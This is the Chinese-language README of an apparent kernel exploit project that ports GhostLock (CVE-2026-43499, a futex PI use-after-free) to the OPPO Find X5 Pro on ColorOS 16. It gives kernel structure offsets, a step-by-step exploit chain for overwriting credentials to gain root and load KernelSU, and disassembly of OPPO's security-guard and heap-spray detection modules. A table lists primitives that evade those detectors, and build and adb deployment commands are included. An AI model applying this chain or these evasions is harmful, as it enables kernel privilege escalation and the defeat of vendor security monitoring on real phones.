# GhostLock — OPPO Find X5 Pro (PFEM10)

[English](README.md) · **中文**

GhostLock（CVE-2026-43499）针对 ColorOS 16 上 OPPO Find X5 Pro 的移植。已做到 `uid=0` 子进程 + `kernelsu.ko` 载入；root 进程被拦截。

## 漏洞

**CVE-2026-43499** —— futex PI 栈 UAF。`rt_mutex_start_proxy_lock()` 的 `-EDEADLK` 回滚路径上，当 `current` 是 requeuer 而非 waiter 时，`remove_waiter()` 会清掉 `current->pi_blocked_on`，waiter 被留在已弹出的栈帧上。

`remove_waiter` @ `0xffffffc0081ed254` —— 修复前形态。

## 设备

| | |
|---|---|
| 机型 | OPPO Find X5 Pro (PFEM10) |
| SoC | SM8450 / Adreno 730 |
| 系统 | ColorOS 16.0.3.520 (CN01) |
| 内核 | `5.10.236-android12-9-o-gaf2075ad2c06` |
| BL | 锁定，green |
| VA_BITS | 39 —— `KIMAGE_TEXT_BASE = 0xffffffc008000000` |

## 进度

| 阶段 | |
|---|---|
| compact waiter 触发（`CMP_REQUEUE_PI` → `EDEADLK`） | 成功 |
| `task_struct` 泄漏（perf） | 成功 |
| PI 写原语（8 字节；值 = `0` 或合法内核地址） | 成功 |
| `task+0x778` / `task+0x780` → `Uid=root` | 成功 |
| `kernelsu.ko` 载入 | 成功 |
| root 进程存活 | 否 |
| Path A（UMH / `modprobe_path`） | `STATIC_USERMODEHELPER_PATH=""` |

## 偏移

`task_struct`

| 字段 | 偏移 |
|---|---|
| `real_cred` / `cred` | `0x778` / `0x780` |
| 缓存的 `syscallno` | `0xdf8` |
| 缓存的 `uid` / `euid` / `gid` / `egid` | `0xe00` / `0xe08` / `0xe10` / `0xe18` |

`thread_info`

| 字段 | 偏移 |
|---|---|
| `flags` | `0x0` |
| `addr_limit` | `0x8` |
| `ttbr0` | `0x10` |
| `preempt_count` | `0x18` |

`cred`

| 字段 | 偏移 | 字段 | 偏移 |
|---|---|---|---|
| `uid` | `0x4` | `cap_inheritable` | `0x28` |
| `gid` | `0x8` | `cap_permitted` | `0x30` |
| `suid` | `0xc` | `cap_effective` | `0x38` |
| `sgid` | `0x10` | `cap_bset` | `0x40` |
| `euid` | `0x14` | `cap_ambient` | `0x48` |
| `egid` | `0x18` | | |
| `fsuid` / `fsgid` | `0x1c` / `0x20` | | |

## 利用链

```
LT#2        perf 泄漏目标 task_struct → 落文件
W7 阶段 1   task+0x778 = init_cred 别名        → "Uid=root"
W7 阶段 2   task+0x780 = init_cred 别名
W7 阶段 3   零写 init_cred+8
exec        memfd_exec("ksud late-load")       → kernelsu ... Live
```

perf 泄漏：`PERF_TYPE_SOFTWARE` / `PERF_COUNT_SW_CPU_CLOCK`，`PERF_SAMPLE_REGS_INTR`，`exclude_user=1`。
取值范围 `[0xffffff8400000000, 0xffffff90000000)`，票数 ≥ 15%。

## 看门狗 —— `oplus_security_guard.ko`

`sys_enter` 缓存：

```asm
ldrsw x8, [x1, #0x118]          ; regs->syscallno
mrs   x9, sp_el0                ; current
ldr   x10, [x9, #0x780]         ; cred
str   x8,  [x9, #0xdf8]
ldr   w8,  [x10, #4]    → str x8, [x9, #0xe00]   ; uid
ldr   w8,  [x10, #0x14] → str x8, [x9, #0xe08]   ; euid
ldr   w8,  [x10, #8]    → str x8, [x9, #0xe10]   ; gid
ldr   w8,  [x10, #0x18] → str x8, [x9, #0xe18]   ; egid
```

`sys_exit` 判据：

```asm
ldr   x0,  [x8, #0xe00]         ; 缓存 uid
cbz   x0, #0x48c                ; 缓存 uid == 0 → 放行
adrp  x9, #0 ; ldrb w9, [x9]    ; g_boot_state
tbnz  w9, #0, #0x48c            ; is_unlocked → 放行
ldr   x9,  [x8, #0x780]         ; cred
ldr   w3,  [x8, #0xdf8]         ; 缓存 syscallno
cmp   x0, w10 ; b.hi #0x468     ; uid 下降沿 → 击杀路径
                                ; euid / gid / egid 同构
ldr   x9,  [x8, #8]             ; addr_limit
cmp   x9,  #0x8000000001
b.lo  #0x48c                    ; addr_limit != KERNEL_DS → 放行
sub   w9,  w3, #0x8f            ; syscallno - 143
cmp   w9,  #0x47
b.hi  #0x4a0                    ; 不在 143..214 → 击杀
ldrsw x12, [x10, x9, lsl #2]    ; 跳转表 @ .rodata+0
br    x11
0x48c: ret
0x4a0: bl oplus_root_check_succ ; printk + kevent_send_to_user
       bl oplus_root_killed     ; printk + do_exit(SIGKILL)
```

`g_boot_state` —— 1 字节 `.data..ro_after_init`，模块 init 时由 `verified_bootstate` 经 `strstr` 推导写入。`is_unlocked()` = `LDRB` + `RET`。

写模块 VA 会 KP（`CONFIG_STRICT_MODULE_RWX=y`）—— 走 physmap 别名 `0xffffff80…`。

上报载荷：`$$sys_call_number@@%d`、`$$set_id_flag@@%d`、`$$addr_limit@@%lx`、`$$enforce@@%d`。

### 豁免 syscall —— `.rodata+0`，索引 143–214

| 143 `setgid` | 144 `setreuid` | 145 `setuid` | 146 `setresuid` |
|---|---|---|---|
| 147 `getresuid` | 149 `getresgid` | 203 `getsockname` | 204 `getpeername` |
| 208 `getsockopt` | 210 `sendmsg` | 213 `brk` | 214 `munmap` |

其余 60 项 → 上报 + 击杀。

## 堆喷探测器 —— `oplus_secure_harden.ko`

| kretprobe | 实际 hook | 过滤 |
|---|---|---|
| `socket_kretprobe` | `ip_setsockopt` | `regs[1]` ∈ {41, 42, 48} |
| `socket_ip6_kretprobe` | `do_ipv6_setsockopt` | `regs[1]` ∈ {41, 42} |
| `cpuinfo_kretprobe` | `cpuinfo_open` | — |
| `setxattr_kretprobe` | `setxattr` | — |
| `sepolicy_reload_kretprobe` | `spolicy_reload` | — |

```asm
ldr  w8, [x1, #8]       ; regs[1]
cmp  w8, #0x29          ; 41 IP_MSFILTER
b.eq #0xd58
cmp  w8, #0x30          ; 48 MCAST_MSFILTER
b.eq #0xd60
cmp  w8, #0x2a          ; 42 MCAST_JOIN_GROUP
b.ne #0xd68             ; 其它 → 直接返回，不调用
bl   oplus_heapspray_check
```

`entry_handler_setxattr` → `oplus_heapspray_check(7)`、`entry_handler_cpuinfo` → `(6)`，均为无条件调用。

`oplus_heapspray_check` —— 4 个计数器 `heapspary_ip4` / `ip6` / `xttr` / `cpuinfo`，`ktime_get_real_ts64` 时间差，7 个上报点（`snprintf` + `printk` + `kevent_send_to_user`），受 `verified_bootstate` 门控。

### 规避

| 原语 | |
|---|---|
| `setsockopt` optname 46 `MCAST_JOIN_SOURCE_GROUP` | 不触发过滤 |
| `setsockopt` level `SOL_IPV6` (41) | 若过滤读的是 `level` 则不触发 |
| `setxattr` | 无条件计数 |
| `/proc/cpuinfo` | 无条件计数 |
| `socket()` / `socketpair()` | 未 hook |
| `sendmsg`、`pipe`、`memfd`、`add_key`、`io_uring`、mmap | 未 hook |

## Config

```
CONFIG_CFI_CLANG=y
CONFIG_PTR_AUTH=y
CONFIG_SHADOW_CALL_STACK=y
CONFIG_STRICT_MODULE_RWX=y
CONFIG_STATIC_USERMODEHELPER=y
CONFIG_STATIC_USERMODEHELPER_PATH=""
CONFIG_SET_FS=y
CONFIG_RANDOMIZE_BASE=y
CONFIG_RANDOMIZE_MODULE_REGION_FULL=n
CONFIG_UNMAP_KERNEL_AT_EL0=y
CONFIG_ARM64_VA_BITS=39
CONFIG_ARM64_SW_TTBR0_PAN=y
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y
CONFIG_RANDOM_KMALLOC_CACHES=n
CONFIG_USER_NS=n
CONFIG_NF_TABLES=n
CONFIG_SYSVIPC=n
CONFIG_ANDROID_BINDER_IPC=y
CONFIG_KASAN=y
```

`perf_event_paranoid = -1`

## 编译

```bash
NDK=/path/to/android-ndk
"$NDK/toolchains/llvm/prebuilt/windows-x86_64/bin/aarch64-linux-android31-clang" \
  -O2 -Isrc/core -Isrc/devices/pfem10 -o exploit_guard src/core/exploit.c
```

## 部署

```bash
adb push exploit_guard /data/local/tmp/e
adb shell chmod 755 /data/local/tmp/e
adb shell /data/local/tmp/e
```

## 文件

```
modules/                  kernelsu.ko (KMI android12-5.10)  ksud  libkernelsu.so
src/core/                 exploit.c  payload.c  payload.h  fdset_map.h
src/devices/pfem10/       pfem10_target.h
tools/                    kdis.py  kdis_ko.py  find_task_off.py  slide_resolve.py
artifacts/                guard_disasm.txt  guard_exempt_table.txt  harden_disasm.txt
```

`tools/kdis_ko.py` —— RELA 按 `sh_info` 匹配；这些 build 的 `.text` 重定位在 `.rela.text.<func>` 里，按名字查会返回空。

## 相关

| 项目 | |
|---|---|
| [JoinChang/ghostlock-oneplus](https://github.com/JoinChang/ghostlock-oneplus) | 参考实现；5.10 compact waiter |
| [NebuSec CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) | GhostLock 原始研究 |

## 许可

GPL-3.0 —— 见 [LICENSE](LICENSE)。
